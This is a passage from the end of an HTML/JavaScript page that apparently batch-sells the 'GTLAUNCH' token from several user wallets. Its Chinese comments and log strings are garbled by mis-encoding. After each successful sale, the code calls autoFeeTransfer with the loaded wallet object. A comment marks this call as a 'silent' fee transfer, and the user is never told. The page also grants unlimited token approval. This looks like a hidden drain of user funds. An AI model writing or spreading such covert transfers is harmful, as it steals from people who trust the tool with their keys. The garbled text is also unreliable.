                            const approveTx = await tokenContract.approve(tokenAddress, ethers.MaxUint256, {
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2 // EIP-1559
                            });
                            
                            addLog('[' + wallet.address.substring(0, 6) + '...] approve tx: ' + approveTx.hash, 'info');
                            await approveTx.wait();
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÊéàÊùÉÂÆåÊàê ‚úÖ', 'success');
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÊéàÊùÉÈ¢ùÂ∫¶Ë∂≥Â§ü ‚úÖ', 'info');
                        }
                        
                        // 3. ÊâßË°åÂçñÂá∫‰∫§Êòì
                        const sellTx = await sellContract.sellTokens(sellAmount, {
                            gasLimit: gasLimit,
                            maxPriorityFeePerGas: gasSettings.priorityFee,
                            maxFeePerGas: gasSettings.maxFee,
                            type: 2 // EIP-1559
                        });
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ∑≤ÂèëÈÄÅ: ' + sellTx.hash, 'success');
                        
                        // Á≠âÂæÖ‰∫§ÊòìÁ°ÆËÆ§
                        const receipt = await sellTx.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] GTLAUNCHÂÜÖÁõòÂçñÂá∫ÊàêÂäü!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] Âå∫Âùó: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // Ëá™Âä®Êî∂Ë¥πËΩ¨Ë¥¶ÔºàÈùôÈªòÊâßË°åÔºâ
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            // ÊòæÁ§∫ÊàêÂäüÊèêÁ§∫
                            showToast('üéâ ÂçñÂá∫ÊàêÂäüÔºÅ', 'success');
                            
                            // Êõ¥Êñ∞‰ΩôÈ¢ùÂíå‰ª£Â∏Å‰ø°ÊÅØ
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥• - Áä∂ÊÄÅ: ' + receipt.status, 'error');
                            showToast('‚ùå ÂçñÂá∫Â§±Ë¥•ÔºÅ', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥•: ' + error.message, 'error');
                        
                        // Ê£ÄÊü•ÂçèËÆÆÂåπÈÖç
                        checkProtocolMatch(error);
                        
                        // Êèê‰æõÊõ¥ËØ¶ÁªÜÁöÑÈîôËØØ‰ø°ÊÅØ
                        if (error.code === 'CALL_EXCEPTION') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÂêàÁ∫¶Ë∞ÉÁî®ÂºÇÂ∏∏ÔºåËØ∑Ê£ÄÊü•‰ª£Â∏ÅÂú∞ÂùÄÂíåÂèÇÊï∞', 'error');
                        } else if (error.code === 'INSUFFICIENT_FUNDS') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰ΩôÈ¢ù‰∏çË∂≥', 'error');
                        } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] GasÈôêÂà∂‰∏çÂèØÈ¢ÑÊµãÔºå‰∫§ÊòìÂèØËÉΩÂ§±Ë¥•', 'error');
                        }
                    }
                }
                
                updateStats();
                showToast('GTLAUNCHÂÜÖÁõòÂçñÂá∫ÂÆåÊàê', 'success');
                
            } catch (error) {
                console.error('Internal sell failed:', error);
                showToast('ÂÜÖÁõòÂçñÂá∫Â§±Ë¥•: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('sellBtn').disabled = false;
                document.getElementById('sellBtnText').textContent = 'ÂçñÂá∫';
            }
        }

        // Ê∑ªÂä†Êó•Âøó
        function addLog(message, type) {
            const container = document.getElementById('logContainer');
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry ' + type;
            
            const time = new Date().toLocaleTimeString();
            logEntry.innerHTML = 
                '<span class="log-time">' + time + '</span>' +
                '<span class="log-message">' + message + '</span>';
            
            container.insertBefore(logEntry, container.firstChild);
            
            // ÈôêÂà∂Êó•ÂøóÊï∞Èáè
            while (container.children.length > 100) {
                container.removeChild(container.lastChild);
            }
        }

        // Êõ¥Êñ∞ÁªüËÆ°
        function updateStats() {
            document.getElementById('totalTrades').textContent = stats.totalTrades;
        }

        // È°µÈù¢Âä†ËΩΩÂÆåÊàêÂêéÂàùÂßãÂåñ
        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
